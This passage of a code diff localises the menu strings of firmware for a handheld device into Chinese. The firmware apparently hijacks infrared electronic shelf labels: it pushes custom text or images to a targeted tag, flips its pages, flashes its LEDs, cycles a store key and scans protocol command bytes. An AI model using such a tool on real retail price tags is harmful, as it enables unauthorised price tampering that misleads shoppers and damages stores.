+            pcfg.push_back(ttItem([&](){ return String("永久保持: ") + (fvr?"开":"关"); }, [&](){ fvr=!fvr; }, false));
+            pcfg.push_back(ttItem([&](){ return "重复次数: " + String(reps); }, [&](){ if(tt_dir>0){if(reps>=500)reps=50;else reps+=50;}else{if(reps<=50)reps=500;else reps-=50;} }, false));
+            pcfg.push_back(ttItem([&](){ return String("连续连发: ") + (spm?"开":"关"); }, [&](){ spm=!spm; }, false));
+            pcfg.push_back({[](){ return String(">> 翻页 <<"); }, [&](){
                 uint8_t payload[6] = {0x06, (uint8_t)((((pg+1)&7)<<3)|0x01|(fvr?0x80:0x00)), 0, 0, (uint8_t)((dur>>8)&0xFF), (uint8_t)(dur&0xFF)};
                 uint8_t buf[TT_MAX_FRAME_SIZE];
                 size_t len = tt_make_addressed_frame(buf, plid, payload, 6);
@@ -54931,19 +55228,19 @@ void tt_target_actions(uint8_t idx) {
                 tt_current_job.repeats = spm ? 0xFFFF : reps;
                 tt_current_job.gap_delay = 2;
                 while (true) {
-                    tt_do_transmit_single(spm ? "Flip (Spam)" : "Page Flip");
-                    if (!tt_result_screen("Page Flip")) break;
+                    tt_do_transmit_single(spm ? "翻页 (连发)" : "切换页面");
+                    if (!tt_result_screen("切换页面")) break;
                 }
             }, true});
-            tt_menu(pcfg, "Change Page");
+            tt_menu(pcfg, "切换页面");
         }});
-        opts.push_back({"LED Test", [&]() {
+        opts.push_back({"LED 测试", [&]() {
             tt_led_test_with_plid(plid);
         }});
-        opts.push_back({"Push Text", [&]() {
+        opts.push_back({"推送文本", [&]() {
             uint16_t w = profile.known ? profile.width : 296;
             uint16_t h = profile.known ? profile.height : 128;
-            if (w == 0 || h == 0) { tt_show_error("Segment - no gfx"); return; }
+            if (w == 0 || h == 0) { tt_show_error("段码屏不支持图形"); return; }
             bool hc = profile.known && profile.color != TT_COLOR_MONO;
             uint8_t sFg = 1, sBg = 0;
             if (w >= 600) tt_text_size = 4; else if (w >= 296) tt_text_size = 3;
@@ -54957,22 +55254,22 @@ void tt_target_actions(uint8_t idx) {
             tc.push_back(ttItem([&](){
                 int cw2 = 6 * tt_text_size, ch2 = 8 * tt_text_size;
                 int mx = ((w-4)/cw2)*((h-4)/ch2);
-                if (tLen > mx) return "Size: " + String(tt_text_size) + " OVERFLOW! max " + mx;
-                return "Size: " + String(tt_text_size) + " (" + tLen + "/" + mx + ")";
+                if (tLen > mx) return "字号: " + String(tt_text_size) + " 超长! 最多 " + mx;
+                return "字号: " + String(tt_text_size) + " (" + tLen + "/" + mx + ")";
             }, [](){ tt_text_size = (tt_dir > 0) ? ((tt_text_size >= 10) ? 1 : tt_text_size + 1) : ((tt_text_size <= 1) ? 10 : tt_text_size - 1); }, false));
-            tc.push_back(ttItem([](){ return "Page: " + String(tt_page); }, [](){ tt_page = (tt_page + tt_dir + 8) % 8; }, false));
-            tc.push_back(ttItem([&w](){ return "Offset X: " + String(tt_pos_x); }, [&w](){ tt_pos_x = (tt_dir > 0) ? ((tt_pos_x + 5 > w) ? 0 : tt_pos_x + 5) : ((tt_pos_x < 5) ? 0 : tt_pos_x - 5); }, false));
-            tc.push_back(ttItem([&h](){ return "Offset Y: " + String(tt_pos_y); }, [&h](){ tt_pos_y = (tt_dir > 0) ? ((tt_pos_y + 5 > h) ? 0 : tt_pos_y + 5) : ((tt_pos_y < 5) ? 0 : tt_pos_y - 5); }, false));
+            tc.push_back(ttItem([](){ return "页面: " + String(tt_page); }, [](){ tt_page = (tt_page + tt_dir + 8) % 8; }, false));
+            tc.push_back(ttItem([&w](){ return "X 偏移: " + String(tt_pos_x); }, [&w](){ tt_pos_x = (tt_dir > 0) ? ((tt_pos_x + 5 > w) ? 0 : tt_pos_x + 5) : ((tt_pos_x < 5) ? 0 : tt_pos_x - 5); }, false));
+            tc.push_back(ttItem([&h](){ return "Y 偏移: " + String(tt_pos_y); }, [&h](){ tt_pos_y = (tt_dir > 0) ? ((tt_pos_y + 5 > h) ? 0 : tt_pos_y + 5) : ((tt_pos_y < 5) ? 0 : tt_pos_y - 5); }, false));
             if (hc) {
-                const char* fN[] = {"White","Black","Red"};
-                const char* bN[] = {"White","Black","Red"};
-                tc.push_back(ttItem([&](){ return String("Text: ") + fN[sFg]; }, [&](){ sFg = (sFg + tt_dir + 3) % 3; }, false));
-                tc.push_back(ttItem([&](){ return String("BG: ") + bN[sBg]; }, [&](){ sBg = (sBg + tt_dir + 3) % 3; }, false));
+                const char* fN[] = {"白","黑","红"};
+                const char* bN[] = {"白","黑","红"};
+                tc.push_back(ttItem([&](){ return String("文字色: ") + fN[sFg]; }, [&](){ sFg = (sFg + tt_dir + 3) % 3; }, false));
+                tc.push_back(ttItem([&](){ return String("背景色: ") + bN[sBg]; }, [&](){ sBg = (sBg + tt_dir + 3) % 3; }, false));
             } else {
-                tc.push_back(ttItem([](){ return String("Invert: ") + (tt_invert ? "ON" : "OFF"); }, [](){ tt_invert = !tt_invert; }, false));
+                tc.push_back(ttItem([](){ return String("反色: ") + (tt_invert ? "开" : "关"); }, [](){ tt_invert = !tt_invert; }, false));
             }
-            tc.push_back(ttItem([](){ return String("Compress: ") + (tt_comp_mode == TT_COMP_AUTO ? "Auto" : tt_comp_mode == TT_COMP_RAW ? "Raw" : "RLE"); }, [](){ tt_comp_mode = (tt_comp_mode + tt_dir + 3) % 3; }, false));
-            tc.push_back({[](){ return String("Preview"); }, [&](){
+            tc.push_back(ttItem([](){ return String("压缩: ") + (tt_comp_mode == TT_COMP_AUTO ? "自动" : tt_comp_mode == TT_COMP_RAW ? "原始" : "RLE"); }, [](){ tt_comp_mode = (tt_comp_mode + tt_dir + 3) % 3; }, false));
+            tc.push_back({[](){ return String("预览"); }, [&](){
                 uint8_t* t2 = tt_render_text(text.c_str(), w, h, tt_text_size, false, tt_pos_x, tt_pos_y);
                 if (!t2) return;
                 uint8_t* p2 = (uint8_t*)calloc(spc, 1); uint8_t* c2 = (uint8_t*)malloc(spc);
@@ -54980,23 +55277,23 @@ void tt_target_actions(uint8_t idx) {
                 memset(c2, 1, spc);
                 if (hc) { for (size_t i=0;i<spc;i++) { bool lit=(t2[0]==0xFE)?((t2[1+i/8]>>(7-(i%8)))&1):(t2[i]!=0); uint8_t g=lit?sFg:sBg; p2[i]=(g==0)?1:0; c2[i]=(g==2)?0:1; } }
                 else { for (size_t i=0;i<spc;i++) { bool lit=(t2[0]==0xFE)?((t2[1+i/8]>>(7-(i%8)))&1):(t2[i]!=0); p2[i] = tt_invert ? !lit : lit; } }
-                M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextFont(1);
-                M5.Display.fillRect(0,0,240,18,TFT_NAVY); M5.Display.setTextSize(1.5);
+                M5.Display.fillScreen(TFT_BLACK); evilKeepCnFont(M5.Display);
+                M5.Display.fillRect(0,0,240,18,TFT_NAVY); evilSetCnFont(M5.Display, 1.5);
                 M5.Display.setCursor(5,3); M5.Display.setTextColor(TFT_GREEN);
-                M5.Display.printf("%ux%u sz%d", w, h, tt_text_size);
+                M5.Display.printf("%ux%u 字号%d", w, h, tt_text_size);
                 if (hc) tt_preview_color(p2, c2, w, h, 20); else tt_preview_pixels(p2, w, h, 20);
                 M5.Display.display(); free(t2); free(p2); free(c2);
                 delay(200); while(true){cardUpdate();if(kp(KEY_BACKSPACE)||kp(KEY_ENTER))break;delay(50);}delay(150);
             }, true});
-            tc.push_back({[](){ return String(">> SEND <<"); }, [&](){
+            tc.push_back({[](){ return String(">> 发送 <<"); }, [&](){
                 uint8_t* t2 = tt_render_text(text.c_str(), w, h, tt_text_size, false, tt_pos_x, tt_pos_y);
-                if (!t2) { tt_show_error("Memory"); return; }
+                if (!t2) { tt_show_error("内存不足"); return; }
                 // Apply invert if needed
                 if (tt_invert) {
                     size_t pbytes2 = (spc + 7) / 8;
                     if (t2[0] == 0xFE) {
                         uint8_t* pv2 = (uint8_t*)malloc(pbytes2 + 1);
-                        if (!pv2) { free(t2); tt_show_error("Memory"); return; }
+                        if (!pv2) { free(t2); tt_show_error("内存不足"); return; }
                         pv2[0] = 0xFE;
                         for (size_t i = 0; i < pbytes2; i++) pv2[1+i] = ~t2[1+i];
                         free(t2); t2 = pv2;
@@ -55006,9 +55303,9 @@ void tt_target_actions(uint8_t idx) {
                 }
                 if (!hc) {
                     // Mono: stream directly
-                    bool ok2 = tt_stream_image(plid, t2, w, h, tt_page, tt_wake_repeats_val, false, tt_comp_mode, "Push Text");
+                    bool ok2 = tt_stream_image(plid, t2, w, h, tt_page, tt_wake_repeats_val, false, tt_comp_mode, "推送文本");
                     free(t2);
-                    if (!ok2) { tt_show_error("Encode err"); return; }
+                    if (!ok2) { tt_show_error("编码错误"); return; }
                 } else {
                     // Color: build primary + secondary with FG/BG mapping
                     size_t pbytes = (spc + 7) / 8;
@@ -55027,9 +55324,9 @@ void tt_target_actions(uint8_t idx) {
                         memset(&tt_current_seq, 0, sizeof(tt_current_seq));
                         bool ok2 = tt_build_image_sequence_planes(&tt_current_seq, plid, p2, c2, w, h, tt_page, 0, 0, tt_wake_repeats_val, tt_comp_mode);
                         free(p2); free(c2);
-                        if (!ok2) { tt_show_error("Encode err"); return; }
+                        if (!ok2) { tt_show_error("编码错误"); return; }
                         tt_tx_progress = 0;
-                        tt_transmit_sequence_inline("Push Text");
+                        tt_transmit_sequence_inline("推送文本");
                     } else {
                         free(p2); free(c2);
                         // Large tags: packed FG/BG mapping → 0xFD format
@@ -55040,9 +55337,9 @@ void tt_target_actions(uint8_t idx) {
                             if (!dual) {
                                 // Try again after freeing t2 — copy to dual directly
                                 // Need t2 alive for mapping, so try smaller: just send mono
-                                bool ok2 = tt_stream_image(plid, t2, w, h, tt_page, tt_wake_repeats_val, true, tt_comp_mode, "Push Text");
+                                bool ok2 = tt_stream_image(plid, t2, w, h, tt_page, tt_wake_repeats_val, true, tt_comp_mode, "推送文本");
                                 free(t2);
-                                if (!ok2) { tt_show_error("Encode err"); return; }
+                                if (!ok2) { tt_show_error("编码错误"); return; }
                             } else {
                                 dual[0] = 0xFD;
                                 // Secondary plane default: all 1s (no color)
@@ -55055,25 +55352,25 @@ void tt_target_actions(uint8_t idx) {
                                     if (g == 2) dual[1 + pbytes + i/8] &= ~(1 << (7-(i%8)));  // secondary: red=0
                                 }
                                 free(t2);
-                                bool ok2 = tt_stream_image(plid, dual, w, h, tt_page, tt_wake_repeats_val, false, tt_comp_mode, "Push Text");
+                                bool ok2 = tt_stream_image(plid, dual, w, h, tt_page, tt_wake_repeats_val, false, tt_comp_mode, "推送文本");
                                 free(dual);
-                                if (!ok2) { tt_show_error("Encode err"); return; }
+                                if (!ok2) { tt_show_error("编码错误"); return; }
                             }
                         } else {
-                            bool ok2 = tt_stream_image(plid, t2, w, h, tt_page, tt_wake_repeats_val, true, tt_comp_mode, "Push Text");
+                            bool ok2 = tt_stream_image(plid, t2, w, h, tt_page, tt_wake_repeats_val, true, tt_comp_mode, "推送文本");
                             free(t2);
-                            if (!ok2) { tt_show_error("Encode err"); return; }
+                            if (!ok2) { tt_show_error("编码错误"); return; }
                         }
                     }
                 }
-                tt_result_screen("Push Text");
+                tt_result_screen("推送文本");
             }, true});
-            tt_menu(tc, "Push Text Config");
+            tt_menu(tc, "推送文本配置");
         }});
-        opts.push_back({"Push Image (BMP)", [&]() {
+        opts.push_back({"推送图片 (BMP)", [&]() {
             uint16_t w = profile.known ? profile.width : 296;
             uint16_t h = profile.known ? profile.height : 128;
-            if (w == 0 || h == 0) { tt_show_error("Segment - no gfx"); return; }
+            if (w == 0 || h == 0) { tt_show_error("段码屏不支持图形"); return; }
 
             std::vector<String> bmpFiles;
             {
@@ -55092,7 +55389,7 @@ void tt_target_actions(uint8_t idx) {
                     dir.close();
                 }
             }
-            if (bmpFiles.size() == 0) { tt_show_error("No BMP in /evil/esl/"); return; }
+            if (bmpFiles.size() == 0) { tt_show_error("/evil/esl/ 中无BMP"); return; }
 
             std::vector<String> bl;
             for (size_t i = 0; i < bmpFiles.size(); i++) {
@@ -55100,14 +55397,14 @@ void tt_target_actions(uint8_t idx) {
                 if (sn.length() > 28) sn = "..." + sn.substring(sn.length() - 25);
                 bl.push_back(sn);
             }
-            int selIdx = tt_menu_select(bl, "Select BMP");
+            int selIdx = tt_menu_select(bl, "选择 BMP");
             if (selIdx < 0) return;
 
             File bmpFile = SD.open(bmpFiles[selIdx]);
-            if (!bmpFile) { tt_show_error("Can't open"); return; }
+            if (!bmpFile) { tt_show_error("无法打开文件"); return; }
             uint8_t header[54];
             if (bmpFile.read(header, 54) != 54 || header[0] != 'B' || header[1] != 'M') {
-                bmpFile.close(); tt_show_error("Invalid BMP"); return;
+                bmpFile.close(); tt_show_error("无效的 BMP"); return;
             }
             int32_t bmpW = *(int32_t*)&header[18];
             int32_t bmpH = *(int32_t*)&header[22];
@@ -55122,12 +55419,12 @@ void tt_target_actions(uint8_t idx) {
             size_t pcPacked = (pc + 7) / 8;
             size_t bufSz2 = dp2 ? (1 + 2*pcPacked) : (1 + pcPacked);
             uint8_t* pixels = (uint8_t*)calloc(bufSz2, 1);
-            if (!pixels) { bmpFile.close(); tt_show_error("Memory"); return; }
+            if (!pixels) { bmpFile.close(); tt_show_error("内存不足"); return; }
             pixels[0] = dp2 ? 0xFD : 0xFE;
             if (dp2) memset(pixels + 1 + pcPacked, 0xFF, pcPacked);
             int rowBytes = ((bmpW * bmpBpp / 8) + 3) & ~3;
             uint8_t* rowBuf = (uint8_t*)malloc(rowBytes);
-            if (!rowBuf) { free(pixels); bmpFile.close(); tt_show_error("Memory"); return; }
+            if (!rowBuf) { free(pixels); bmpFile.close(); tt_show_error("内存不足"); return; }
 
             float sW2 = (float)w/bmpW, sH2 = (float)h/bmpH;
             float sc2 = (sW2 < sH2) ? sW2 : sH2;
@@ -55169,17 +55466,17 @@ void tt_target_actions(uint8_t idx) {
             std::vector<TtMenuItem> ic;
             String ti2 = String(w) + "x" + String(h) + " BMP:" + String(bmpW) + "x" + String(bmpH);
             ic.push_back(ttItem([ti2](){ return ti2; }, [](){}, false));
-            ic.push_back(ttItem([](){ return "Page: " + String(tt_page); }, [](){ tt_page = (tt_page + tt_dir + 8) % 8; }, false));
-            ic.push_back(ttItem([&inv2](){ return String("Invert: ") + (inv2 ? "OFF" : "ON"); }, [&inv2](){ inv2 = !inv2; }, false));
+            ic.push_back(ttItem([](){ return "页面: " + String(tt_page); }, [](){ tt_page = (tt_page + tt_dir + 8) % 8; }, false));
+            ic.push_back(ttItem([&inv2](){ return String("反色: ") + (inv2 ? "关" : "开"); }, [&inv2](){ inv2 = !inv2; }, false));
             if (hc2) {
-                ic.push_back(ttItem([&dp2](){ return String("Color: ") + (dp2 ? "B/W/R" : "B/W"); }, [&dp2](){ dp2 = !dp2; }, false));
+                ic.push_back(ttItem([&dp2](){ return String("颜色: ") + (dp2 ? "黑/白/红" : "黑/白"); }, [&dp2](){ dp2 = !dp2; }, false));
             }
-            ic.push_back(ttItem([](){ return String("Compress: ") + (tt_comp_mode == TT_COMP_AUTO ? "Auto" : tt_comp_mode == TT_COMP_RAW ? "Raw" : "RLE"); }, [](){ tt_comp_mode = (tt_comp_mode + tt_dir + 3) % 3; }, false));
-            ic.push_back({[](){ return String("Preview"); }, [&](){
-                M5.Display.clear(); M5.Display.setTextFont(1);
+            ic.push_back(ttItem([](){ return String("压缩: ") + (tt_comp_mode == TT_COMP_AUTO ? "自动" : tt_comp_mode == TT_COMP_RAW ? "原始" : "RLE"); }, [](){ tt_comp_mode = (tt_comp_mode + tt_dir + 3) % 3; }, false));
+            ic.push_back({[](){ return String("预览"); }, [&](){
+                M5.Display.clear(); evilKeepCnFont(M5.Display);
                 M5.Display.fillRect(0, 0, 240, 18, TFT_NAVY);
-                M5.Display.setTextSize(1.5); M5.Display.setCursor(5, 3); M5.Display.setTextColor(TFT_WHITE);
-                M5.Display.printf("%s %ux%u%s", profile.model_name ? profile.model_name : "?", w, h, inv2 ? " INV" : "");
+                evilSetCnFont(M5.Display, 1.5); M5.Display.setCursor(5, 3); M5.Display.setTextColor(TFT_WHITE);
+                M5.Display.printf("%s %ux%u%s", profile.model_name ? profile.model_name : "?", w, h, inv2 ? " 反色" : "");
                 if (dp2) {
                     size_t pvSz = 1 + 2*pcPacked;
                     uint8_t* pv = (uint8_t*)malloc(pvSz);
@@ -55209,64 +55506,64 @@ void tt_target_actions(uint8_t idx) {
                 M5.Display.print("[BACK]"); M5.Display.display();
                 delay(200); while (true) { cardUpdate(); if (kp(KEY_BACKSPACE)||kp(KEY_ENTER)) break; delay(50); } delay(150);
             }, true});
-            ic.push_back({[](){ return String(">> SEND <<"); }, [&](){
+            ic.push_back({[](){ return String(">> 发送 <<"); }, [&](){
                 // In-place invert to save heap for RLE
                 if (inv2 && pixels[0] == 0xFE) {
                     for (size_t i = 0; i < pcPacked; i++) pixels[1+i] = ~pixels[1+i];
                 }
-                bool ok3 = tt_stream_image(plid, pixels, w, h, tt_page, tt_wake_repeats_val, hc2, tt_comp_mode, "Push Image");
+                bool ok3 = tt_stream_image(plid, pixels, w, h, tt_page, tt_wake_repeats_val, hc2, tt_comp_mode, "推送图片");
                 if (inv2 && pixels[0] == 0xFE) {
                     for (size_t i = 0; i < pcPacked; i++) pixels[1+i] = ~pixels[1+i];
                 }
-                if (!ok3) { tt_show_error("Encode err"); return; }
-                tt_result_screen("Push Image");
+                if (!ok3) { tt_show_error("编码错误"); return; }
+                tt_result_screen("推送图片");
             }, true});
-            tt_menu(ic, "Push Image Config");
+            tt_menu(ic, "推送图片配置");
             free(pixels);
         }});
-        opts.push_back({"Online Content", [&]() {
+        opts.push_back({"在线内容", [&]() {
             uint16_t ow = profile.known ? profile.width : 296;
             uint16_t oh = profile.known ? profile.height : 128;
-            if (ow == 0 || oh == 0) { tt_show_error("Segment - no gfx"); return; }
+            if (ow == 0 || oh == 0) { tt_show_error("段码屏不支持图形"); return; }
             bool ohc = profile.known && profile.color != TT_COLOR_MONO;
             tt_online_content_with(plid, ow, oh, ohc);
         }});
-        opts.push_back({"Info", [&]() {
+        opts.push_back({"标签信息", [&]() {
             bool vc = tt_is_barcode_valid(tgt.barcode);
             char ps[18]; snprintf(ps, sizeof(ps), "%02X:%02X:%02X:%02X", plid[0], plid[1], plid[2], plid[3]);
             std::vector<TtMenuItem> nfo;
-            nfo.push_back(ttItem([&](){ return String("BC: ") + tgt.barcode; }, [](){}, false));
+            nfo.push_back(ttItem([&](){ return String("条码: ") + tgt.barcode; }, [](){}, false));
             nfo.push_back(ttItem([ps](){ return String("PLID: ") + ps; }, [](){}, false));
-            nfo.push_back(ttItem([&](){ return "Type: " + String(profile.type_code); }, [](){}, false));
-            nfo.push_back(ttItem([vc](){ return String("Format: ") + (vc ? "Valid" : "Bad digits"); }, [](){}, false));
+            nfo.push_back(ttItem([&](){ return "类型码: " + String(profile.type_code); }, [](){}, false));
+            nfo.push_back(ttItem([vc](){ return String("格式: ") + (vc ? "有效" : "校验错误"); }, [](){}, false));
             if (profile.known) {
-                if (profile.model_name) nfo.push_back(ttItem([&](){ return String("Model: ") + profile.model_name; }, [](){}, false));
-                nfo.push_back(ttItem([&](){ return "Display: " + String(profile.width) + "x" + String(profile.height); }, [](){}, false));
-                nfo.push_back(ttItem([&](){ return String("Kind: ") + (profile.kind == TT_KIND_DOTMATRIX ? "Dot Matrix" : "Segment"); }, [](){}, false));
-                const char* cs = profile.color == TT_COLOR_RED ? "Red" : profile.color == TT_COLOR_YELLOW ? "Yellow" : "Mono";
-                nfo.push_back(ttItem([cs](){ return String("Color: ") + cs; }, [](){}, false));
-                nfo.push_back(ttItem([](){ return String("Pages: 1-4 (model dependent)"); }, [](){}, false));
-                nfo.push_back(ttItem([&](){ return "PL Bit: " + String(profile.pl_bit_def); }, [](){}, false));
+                if (profile.model_name) nfo.push_back(ttItem([&](){ return String("型号: ") + profile.model_name; }, [](){}, false));
+                nfo.push_back(ttItem([&](){ return "分辨率: " + String(profile.width) + "x" + String(profile.height); }, [](){}, false));
+                nfo.push_back(ttItem([&](){ return String("屏型: ") + (profile.kind == TT_KIND_DOTMATRIX ? "点阵屏" : "段码屏"); }, [](){}, false));
+                const char* cs = profile.color == TT_COLOR_RED ? "红" : profile.color == TT_COLOR_YELLOW ? "黄" : "黑白";
+                nfo.push_back(ttItem([cs](){ return String("颜色: ") + cs; }, [](){}, false));
+                nfo.push_back(ttItem([](){ return String("页数: 1-4 (取决于型号)"); }, [](){}, false));
+                nfo.push_back(ttItem([&](){ return "PL 位: " + String(profile.pl_bit_def); }, [](){}, false));
                 size_t px = (size_t)profile.width * profile.height;
                 size_t rb = (px + 7) / 8;
                 size_t fr = (rb + 19) / 20;
-                nfo.push_back(ttItem([px](){ return "Pixels: " + String((uint32_t)px); }, [](){}, false));
-                nfo.push_back(ttItem([rb](){ return "Raw: " + String((uint32_t)rb) + " B"; }, [](){}, false));
-                nfo.push_back(ttItem([fr](){ return "Frames: " + String((uint32_t)fr); }, [](){}, false));
-                nfo.push_back(ttItem([px](){ return String("Compress: ") + (px > 5000 ? "RLE recommended" : "Raw OK"); }, [](){}, false));
+                nfo.push_back(ttItem([px](){ return "像素数: " + String((uint32_t)px); }, [](){}, false));
+                nfo.push_back(ttItem([rb](){ return "原始大小: " + String((uint32_t)rb) + " B"; }, [](){}, false));
+                nfo.push_back(ttItem([fr](){ return "帧数: " + String((uint32_t)fr); }, [](){}, false));
+                nfo.push_back(ttItem([px](){ return String("压缩建议: ") + (px > 5000 ? "推荐 RLE" : "原始即可"); }, [](){}, false));
             } else {
-                nfo.push_back(ttItem([](){ return String("Unknown tag type"); }, [](){}, false));
+                nfo.push_back(ttItem([](){ return String("未知标签类型"); }, [](){}, false));
             }
-            tt_menu(nfo, tgt.name[0] ? tgt.name : "Tag Info");
+            tt_menu(nfo, tgt.name[0] ? tgt.name : "标签信息");
         }});
-        opts.push_back({"Rename", [&]() {
-            String newName = tt_get_text_input("Enter text", false);
+        opts.push_back({"重命名", [&]() {
+            String newName = tt_get_text_input("输入名称", false);
             if (newName.length() > 0) {
                 strncpy(tgt.name, newName.c_str(), 31); tgt.name[31] = 0;
                 tt_targets_save();
             }
         }});
-        opts.push_back({"Delete", [&, idx]() {
+        opts.push_back({"删除", [&, idx]() {
             tt_target_delete(idx);
             running = false;
         }});
@@ -55284,9 +55581,9 @@ void tt_saved_targets_menu() {
         std::vector<String> labels;
         for (uint8_t i = 0; i < tt_target_count; i++)
             labels.push_back(tt_targets[i].name[0] ? tt_targets[i].name : tt_targets[i].barcode);
-        labels.push_back("+ Add New Tag");
+        labels.push_back("+ 添加新标签");
 
-        String title = "Saved Tags (" + String(tt_target_count) + ")";
+        String title = "已存标签 (" + String(tt_target_count) + ")";
         int sel = tt_menu_select(labels, title.c_str());
         if (sel < 0) return;
 
@@ -55295,7 +55592,7 @@ void tt_saved_targets_menu() {
         } else {
             String bc = tt_get_barcode();
             if (bc.length() == TT_BC_LEN) {
-                String name = tt_get_text_input("Name (optional)", true);
+                String name = tt_get_text_input("名称 (可选)", true);
                 tt_target_add(bc.c_str(), name.c_str());
             }
         }
@@ -55304,17 +55601,17 @@ void tt_saved_targets_menu() {
 
 void tt_settings_menu() {
     std::vector<TtMenuItem> cfg;
-    cfg.push_back({[](){ return String("Compress: ") + (tt_comp_mode == TT_COMP_AUTO ? "Auto" : tt_comp_mode == TT_COMP_RAW ? "Raw" : "RLE"); },
+    cfg.push_back({[](){ return String("压缩: ") + (tt_comp_mode == TT_COMP_AUTO ? "自动" : tt_comp_mode == TT_COMP_RAW ? "原始" : "RLE"); },
         [](){ tt_comp_mode = (tt_comp_mode + tt_dir + 3) % 3; }, false});
-    cfg.push_back({[](){ return "Data Repeats: " + String(tt_data_repeats); },
+    cfg.push_back({[](){ return "数据重复: " + String(tt_data_repeats); },
         [](){ tt_data_repeats = (tt_dir > 0) ? ((tt_data_repeats >= 15) ? 1 : tt_data_repeats + 1) : ((tt_data_repeats <= 1) ? 15 : tt_data_repeats - 1); }, false});
-    cfg.push_back({[](){ return "Wake Repeats: " + String(tt_wake_repeats_val); },
+    cfg.push_back({[](){ return "唤醒重复: " + String(tt_wake_repeats_val); },
         [](){ if (tt_dir > 0) { if (tt_wake_repeats_val >= 995) tt_wake_repeats_val = 10; else tt_wake_repeats_val += 5; } else { if (tt_wake_repeats_val <= 10) tt_wake_repeats_val = 995; else tt_wake_repeats_val -= 5; } }, false});
-    cfg.push_back({[](){ char b[24]; snprintf(b,sizeof(b),"Store Key: 0x%04X",tt_store_key); return String(b); },
+    cfg.push_back({[](){ char b[24]; snprintf(b,sizeof(b),"门店密钥: 0x%04X",tt_store_key); return String(b); },
         [](){ tt_store_key = (uint16_t)(tt_store_key + tt_dir * 0x0100); }, false});
-    cfg.push_back({[](){ return String("Protocol: ") + (tt_use_pp16 ? "PP16 (4x fast)" : "PP4 (standard)"); },
+    cfg.push_back({[](){ return String("协议: ") + (tt_use_pp16 ? "PP16 (4倍速)" : "PP4 (标准)"); },
         [](){ tt_use_pp16 = !tt_use_pp16; }, false});
-    tt_menu(cfg, "TagTinker Settings");
+    tt_menu(cfg, "TagTinker 设置");
 }
 
 // ---------- Raw Frame sender ----------
@@ -55364,7 +55661,7 @@ void tt_led_explorer() {
     std::vector<String> tagLabels;
     for (uint8_t i = 0; i < tt_target_count; i++)
         tagLabels.push_back(tt_targets[i].name[0] ? tt_targets[i].name : tt_targets[i].barcode);
-    int ti = tt_menu_select(tagLabels, "Select Tag");
+    int ti = tt_menu_select(tagLabels, "选择目标价签");
     if (ti < 0) return;
     uint8_t plid[4];
     tt_barcode_to_plid(tt_targets[ti].barcode, plid);
@@ -55401,16 +55698,16 @@ void tt_led_explorer() {
             const TtLedTest& t = tt_led_tests[i];
             M5.Display.fillScreen(TFT_BLACK);
             M5.Display.fillRect(0,0,240,18,TFT_NAVY);
-            M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
+            evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5);
             M5.Display.setCursor(5,3); M5.Display.setTextColor(TFT_GREEN);
             M5.Display.printf("Test %d/%d %s",i+1,tt_led_test_count, useBroadcast?"[BC]":"");
-            M5.Display.setTextSize(2); M5.Display.setCursor(5,28); M5.Display.setTextColor(TFT_WHITE);
+            evilSetCnFont(M5.Display, 2); M5.Display.setCursor(5,28); M5.Display.setTextColor(TFT_WHITE);
             M5.Display.print(t.desc);
             char hex[40]; snprintf(hex,sizeof(hex),"M:0x%02X B2:0x%02X B3:0x%02X D:%02X%02X",t.mode,t.b2,t.b3,t.durH,t.durL);
-            M5.Display.setTextSize(1); M5.Display.setCursor(5,52); M5.Display.setTextColor(TFT_CYAN);
+            evilSetCnFont(M5.Display, 1); M5.Display.setCursor(5,52); M5.Display.setTextColor(TFT_CYAN);
             M5.Display.print(hex);
-            M5.Display.setCursor(5,68); M5.Display.setTextColor(TFT_ORANGE); M5.Display.print("Sending...");
-            M5.Display.setCursor(5,122); M5.Display.setTextColor(TFT_DARKGREY); M5.Display.print("[BACK] Stop");
+            M5.Display.setCursor(5,68); M5.Display.setTextColor(TFT_ORANGE); M5.Display.print("正在发送红外指令...");
+            M5.Display.setCursor(5,122); M5.Display.setTextColor(TFT_DARKGREY); M5.Display.print("[退格键] 停止");
             M5.Display.display();
             uint8_t pb[TT_MAX_FRAME_SIZE];
             size_t pl = tt_make_ping_frame(pb, pid);
@@ -55419,7 +55716,7 @@ void tt_led_explorer() {
             uint8_t buf[TT_MAX_FRAME_SIZE];
             size_t len = tt_make_addressed_frame(buf, pid, pay, 6);
             tt_lab_send_raw(pid, buf, len, 30, t.desc);
-            M5.Display.setCursor(5,68); M5.Display.setTextColor(TFT_GREEN); M5.Display.print("Observe 3s...   ");
+            M5.Display.setCursor(5,68); M5.Display.setTextColor(TFT_GREEN); M5.Display.print("观察价签 3秒...   ");
             M5.Display.display();
             unsigned long wait = millis();
             while (millis()-wait < 3000) { cardUpdate(); if(kp(KEY_BACKSPACE)){tt_ir_stop_requested=true;break;} delay(30); }
@@ -55427,7 +55724,7 @@ void tt_led_explorer() {
         }
         if (!tt_ir_stop_requested) tt_show_success("All tests done");
     }, true});
-    tt_menu(cfg, "LED Explorer");
+    tt_menu(cfg, "LED 闪烁探索器");
 }
 
 // ========== Protocol Lab — exhaustive reverse-engineering test suite ==========
@@ -55480,12 +55777,12 @@ void tt_lab_cmd06_scan(const uint8_t plid[4]) {
             if (tt_ir_stop_requested) break;
             val = (uint8_t)v;
             M5.Display.fillScreen(TFT_BLACK);
-            M5.Display.setTextFont(1); M5.Display.setTextSize(2);
+            evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 2);
             M5.Display.setCursor(5,5); M5.Display.setTextColor(TFT_GREEN);
             M5.Display.printf("CMD06 0x%02X (%d/256)", v, v+1);
-            M5.Display.setTextSize(1); M5.Display.setCursor(5,30); M5.Display.setTextColor(TFT_CYAN);
+            evilSetCnFont(M5.Display, 1); M5.Display.setCursor(5,30); M5.Display.setTextColor(TFT_CYAN);
             M5.Display.printf("Bits: %c%c%c%c%c%c%c%c", v&128?'1':'0',v&64?'1':'0',v&32?'1':'0',v&16?'1':'0',v&8?'1':'0',v&4?'1':'0',v&2?'1':'0',v&1?'1':'0');
-            M5.Display.setCursor(5,122); M5.Display.setTextColor(TFT_DARKGREY); M5.Display.print("[BACK] Stop");
+            M5.Display.setCursor(5,122); M5.Display.setTextColor(TFT_DARKGREY); M5.Display.print("[退格键] 停止");
             M5.Display.display();
             uint8_t pay[6] = {0x06, (uint8_t)v, b2, b3, 0x00, 0x03};
             uint8_t buf[TT_MAX_FRAME_SIZE];
@@ -55496,7 +55793,7 @@ void tt_lab_cmd06_scan(const uint8_t plid[4]) {
